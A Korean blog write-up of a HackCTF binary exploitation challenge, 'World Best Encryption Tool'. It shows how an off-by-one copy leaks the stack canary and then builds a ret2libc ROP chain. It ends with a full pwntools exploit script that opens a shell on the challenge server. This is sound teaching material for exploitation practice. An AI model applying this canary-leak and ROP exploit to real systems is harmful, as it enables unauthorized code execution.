---
layout: post
title:  "HacCTF World Best Encryption Tool write-up"
date:   2020-03-16 19:45:55
image:  hackctf_encryption.PNG
tags:   [HackCTF]
categories: [Write-up]
---

### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled.png)

이번 문제는 카나리가 추가로 설정되어있다.
<br><br><br>


**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%201.png)

문자열을 입력하면, 해당 문자열이 암호화되어 출력된다. 그다음 다시 입력을 할 것인지 묻게 되는데 여기서 Yes를 입력하면 재입력이 가능하며 No를 누르면 다음과 같이 프로그램이 종료된다
<br><br><br>


**3) 코드 흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%202.png)

do - while 문이 보인다. 처음 src에 입력을 하고 해당 문자열을 0x31바이트만큼 xor 연산을 하게 된다. 그다음 dest에 0x39 사이즈 만큼 복사를 하고 해당 dest에 들어가 내용을 출력한다.

s1에 들어간 값이 Yes인지 No인지 strcmp() 를 이용하여 확인을 한다. Yes 입력시 다시 반복문을 실행하게 된다.
<br><br><br>




### 2. 접근방법

---

14라인의 scanf를 이용하여 BOF를 발생시킬수 있다. 하지만 현재 카나리가 걸려있다. 따라서 단순히 BOF를 일으키면 카나리 값이 변조되어 프로그램이 강제 종료가된다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%203.png)

위와 같이 stack smashing detected 되었다면서 종료가 된다.
<br><br><br>
이 카나리값만 알게 된다면 rbp-0x8 위치에 카나리를 넣고 ROP를 진행하면 될것으로 보인다.
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%204.png)

scanf로 src에 처음에 입력을 받고, src에 있는 데이터를 dest로 최대 0x39 바이트 만큼 복사가 이루어진다. 노란 영역이 복사될수 있는 최대영역인데, 카나라의 하위 한바이트를 변조 가능하다.

카나리는 하위 한바이트가 널값이기 때문에 만약 src에 들어있는 데이터가 0x38까지라면 strncpy를 통해 0x38바이트만 복사된다. 따라서 printf이 호출되면 널값이 존재하는 카나리 직전까지만 출력이 된다.
<br><br>
따라서 src에 0x39 만큼 입력을하면, dest에 0x39사이즈 만큼 복사가 이루어지고, 카나리의 하위 한바이트를 변경가능하다. 이를 통해  printf가 진행되면 카나리의 값을 leak할 수 있다.
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%205.png)

0x38만큼 A를 입력하고 B를 하나 입력한 결과이다. 이렇게되면 printf되어 출력되는 데이터들을 받게 되는데 빨간동그라미가 한바이트 덮은 B이고 나머지가 카나리 값이다. 이를 이용하여 이제 ROP를 진행하면 된다. 여기서 카나리 값의 하위 1바이트를 0으로 만들어서 이용하면 끝이다.


<br><br><br>
- **시나리오**
    1. **libc 주소 leak하기**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%206.png)

        처음에는 printf_got를 인자로 printf_plt를 호출하여 printf함수의 주소를 얻으려고 했지만, 이상하게 동작을 하지 않았다. 따라서 puts_got, Puts_plt를 이용하였는데도 이상하게 안돼서 scanf_got로 put_plt를 호출하니 이제서야됐다.

        !![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%207.png)
<br><br>
    2. **libc database로 libc버전 확인해서 오프셋 조지기**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20World%20Best%20Encryption%20Tool/Untitled%208.png)

        이제 ROP를 조지면 끝이다.



<br><br><br>

### 3. 풀이

---

& 연산으로 카나리 하위 1바이트를 다시 0으로 만들고 진행하였다.

처음 src에 값을 넣은뒤 strncpy가 진행되므로 카나리의 하위 1바이트의 널값이 변경되면 안됀다.
<br><br>
이를 고려하여 작성한 최종 익스코드는 다음과 같다
```python
from pwn import *
context.log_level="DEBUG"
p=remote("ctf.j0n9hyun.xyz",3027)
#p=process("./World_best_encryption_tool")
e=ELF("./World_best_encryption_tool")
#gdb.attach(p)

p.recvuntil("Your text)\n")

payload="A"*0x38+"B"

p.sendline(payload)
p.recv(0x48)
canary=p.recv(8)
canary=u64(canary)

log.info("canary::")
log.info(hex(canary))
canary=canary&0xFFFFFFFFFFFFFF00
log.info(hex(canary))

pr=0x4008e3

p.recvuntil("(Yes/No)\n")
p.sendline("Yes")
p.recvuntil("Your text)\n")

payload2="A"*56
payload2+="\x00"
payload2+="B"*63
payload2+=p64(canary)
payload2+="C"*8
payload2+=p64(pr)
payload2+=p64(0x601048)
payload2+=p64(0x4005e0)
payload2+=p64(0x400727)
pause()
p.sendline(payload2)

p.recvuntil("(Yes/No)\n")
p.sendline("No")

tmp=p.recvline()
log.info(tmp)
scanf_addr=u64(tmp[0:6]+"\x00\x00")
log.info("scanf:"+hex(scanf_addr))

libc_base=scanf_addr-0x06b4d0
binsh=libc_base+0x18cd57
system_addr=libc_base+0x045390	
p.recvuntil("Your text)\n")

payload3="A"*56
payload3+="\x00"
payload3+="B"*63
payload3+=p64(canary)
payload3+="C"*8
payload3+=p64(pr)
payload3+=p64(binsh)
payload3+=p64(system_addr)
pause()
p.sendline(payload3)

p.recvuntil("(Yes/No)\n")
p.sendline("No")


p.interactive()
```



<br><br><br>
### 4. 몰랐던 개념

---

카나리의 하위 한바이트가 널값인지는 몰랐다.  아래 사이트에서 카나리 관련 개념을 좀 알아볼 필요가 있을 듯 싶다.

- [03.Canaries](https://www.lazenca.net/display/TEC/03.Canaries)

또한 이번 문제는 서버와 통신하는 타이밍 때문에 애좀 썻다.